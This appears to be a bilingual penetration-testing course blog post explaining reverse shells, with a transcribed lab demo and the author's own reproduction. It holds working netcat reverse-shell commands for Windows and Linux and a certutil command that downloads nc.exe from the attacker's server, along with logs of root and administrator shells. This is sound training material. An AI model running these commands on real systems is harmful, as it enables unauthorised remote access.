---
layout: post
title: "Reverse Shells"
date: "2023-04-20"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - Exploitation
---

# Reverse Shells
## Reverse Shells
A reverse shell is a type of remote shell where the target connects directly to a listener on the attacker's system, consequently allowing for execution of commands on the target system.

反向 shell 是一种远程 shell，其中目标直接连接到攻击者系统上的侦听器，从而允许在目标系统上执行命令。

![Reverse Shells](/img/in-post/ine/微信图片_20230419111710.png)

Target connects to Netcat listener on Attacker system

目标连接到攻击者系统上的 Netcat 侦听器

# Demo: Reverse Shells（演示：反向 shell）
We're going to get an understanding of what reverse shells are, how they work, and some of the advantages reverse shells have over bind shells.

It's very important to note that in the context of reverse shell, the connection can be initiated from the target system without Netcat. Because in the context of a bind shell, you needed to set up a listener on the target system, and this can only realistically be done with Netcat. However, in the context of a reverse shell, the only thing you need is you need a connection being made from the target system to the listener. So that's the key thing that you need to remember here. 

And if we just take a look at the diagram again, what we're going to do is set up a Netcat listener on the attacker's system, and then we need to find a way of getting the target system to connect to the Netcat listener. In the practical demonstration, we will be connecting to the Netcat listener in client mode. But this can be done in other ways.

A reverse shell is much better than a bind shell for the first reason. The fact that you don't need to set up a listener on the target system. Furthermore, it is better because outgoing traffic from a system is really not blocked by firewalls. And as a result, the actual chances of success when it comes down to using a reverse shell over a bind shell are much higher. These are the two advantages.

What is the issue with a reverse shell? Let's say we are able to get the target system to connect somehow to the attacker system. In order for that connection to be made, the target system needs the IP address of the attacker system, which is bad for two reasons. Number one, the exploit that you'll be using will have to find a way of getting the attacker's IP. The attacker's IP transferred over to the target system. And the other issue with that is that the attacker's IP is then leaked or made public if that particular connection is ever noted. They'll immediately be able to tell that this IP is the IP address of an attacker. So you need to keep that in mind. And, if the exploit file is currently on disk on the target system, and that file contains the attacker's IP, that's another piece of information that a security analyst will be able to obtain. And at that point, you have been discovered, even if you're utilizing a C2 or command and control server to facilitate the attack or to receive a connection from the target system. So whenever you utilize the Metasploit Framework, and you're trying to obtain a Meterpreter session, you are obtaining a reverse shell. Reverse shells are much better than bind shells and are frequently used by attackers and penetration testers.

Now that we have an understanding of what reverse shells are and their advantage over standard bind shell.

Target IP Address: 10.4.28.70

Kali Linux: 10.10.0.2

```
C:\Users\Administrator\Desktop>dir
```

In the case of a reverse shell, we need to set up the Netcat listener on the attacker system, which in this case, is Kali Linux.

Open up my terminal here.

However, in this case, because this is a reverse shell, we do not need to specify the shell that we want executed. So we can just set up the listener. And then from the target side, the target is going to be connecting to the listener on the attacker's side, so that is outgoing traffic.

```
nc -nvlp 1234
```

And we can head over into the target system, which is running Windows. And this is what we are trying to gain a reverse shell on.

We're making a connection, so we can say `-nv` for no DNS resolution and verbose output. And then we specify the attacker's IP address.

Remember, this is one of the disadvantages of this. The attacker's IP address needs to be available on the target system in order for the connection to be made.

We're connecting to the attacker's IP on port 1234. Once that is done, we can now execute on the target site, the shell that we want access, that we require or that will provide us with remote access or the ability to execute commands remotely. In this case, because the target system is a Windows system, we can say `-e` cmd.exe, or PowerShell.exe.

```
C:\Users\Administrator\Desktop>nc.exe -nv 10.10.0.2 1234 -e cmd.exe 
```

The connection is made, and we head over to the attacker system. We get a command shell session or a command prompt session. And we're able to execute commands.

```
C:\Users\Administrator\Desktop>whoami
```

That is how a reverse shell works.

This process can also be replicated for Linux systems. so if I just show you how this would work locally.

We wanted to obtain a reverse shell on our Kali Linux system.

We can set up a listener on Kali.

```
nc -nvlp 1234
```

And we can obtain a reverse shell on Kali as well.

On the other terminal. And we want to connect to our own IP. And we can paste the attacker's IP there, or just the local host. So we're connecting to that port, where the Netcat listener is running. And because this is a Linux system, we're going to execute `/bin/bash` .

```
nc -nv 10.10.0.2 1234 -e /bin/bash 
```

And on the listener, we should receive a reverse shell.

```
ls -al
```

The process can be repeated on multiple operating systems, irregardless of whether or not it's Windows or Linux. And all you need to do is just change the shell that's being executed.

The great thing about a reverse shell is, because the connection to the Netcat listener is being made from the target system, the connection doesn't need to be made via Netcat. It can also be made via some PowerShell code, or in the case of Linux, by some standard bash code.

This is pretty much just a standard demonstration of how a reverse shell works. And you can see the differences in terms of the connection. And I've already highlighted the advantages of using a reverse shell.

Now that we know how a reverse shell works, and how it can be set up, and orchestrated with Netcat, we are going to be taking a look at a reverse shell cheatsheet and how we can simplify the process of obtaining a reverse shell without reliance on Netcat.

# 复现视频内容
Target IP Address : 10.0.24.45

Kali Linux : 10.10.16.3

```
root@attackdefense:~# cd /usr/share/windows-binaries
root@attackdefense:/usr/share/windows-binaries# ls
enumplus     fport	  nbtenum    radmin.exe     whoami.exe
exe2bat.exe  klogger.exe  nc.exe     vncviewer.exe
fgdump	     mbenum	  plink.exe  wget.exe
root@attackdefense:/usr/share/windows-binaries# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...

```

```
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>cd Desktop

C:\Users\Administrator\Desktop>certutil -urlcache -f http://10.10.16.3/nc.exe nc
.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

```

```
root@attackdefense:/usr/share/windows-binaries# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.0.24.45 - - [20/Apr/2023 20:00:00] "GET /nc.exe HTTP/1.1" 200 -
10.0.24.45 - - [20/Apr/2023 20:00:00] "GET /nc.exe HTTP/1.1" 200 -

```

```
C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is AEDF-99BD

 Directory of C:\Users\Administrator\Desktop

04/20/2023  02:30 PM    <DIR>          .
04/20/2023  02:30 PM    <DIR>          ..
09/11/2020  08:17 AM             1,050 BadBlue Enterprise Edition.lnk
04/20/2023  02:30 PM            59,392 nc.exe
               2 File(s)         60,442 bytes
               2 Dir(s)   9,284,546,560 bytes free

```

```
root@attackdefense:~# nc -nvlp 1234
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234

```

```
C:\Users\Administrator\Desktop>nc.exe -nv 10.10.16.3 1234 -e cmd.exe
(UNKNOWN) [10.10.16.3] 1234 (?) open

```

```
root@attackdefense:~# nc -nvlp 1234
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.0.24.45.
Ncat: Connection from 10.0.24.45:49276.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\Desktop>whoami
whoami
win-omcnbkr66mn\administrator
```

```
root@attackdefense:~# nc -nvlp 1234
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234

```

```
root@attackdefense:~# nc -nv 10.10.16.3 1234 -e /bin/bash
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Connected to 10.10.16.3:1234.

```

```
root@attackdefense:~# nc -nvlp 1234
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.16.3.
Ncat: Connection from 10.10.16.3:49430.
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)

```

The Windows Server 2012 R2 is attacker: 10.0.24.45

The kali Linux is the vitim: 10.10.16.3

```
C:\Users\Administrator\Desktop>nc.exe -nvlp 1234
listening on [any] 1234 ...

```

```
root@attackdefense:~# nc -nv 10.0.24.45 1234 -e /bin/bash
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Connected to 10.0.24.45:1234.

```

```
C:\Users\Administrator\Desktop>nc.exe -nvlp 1234
listening on [any] 1234 ...
connect to [10.0.24.45] from (UNKNOWN) [10.10.16.3] 51068
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root

```
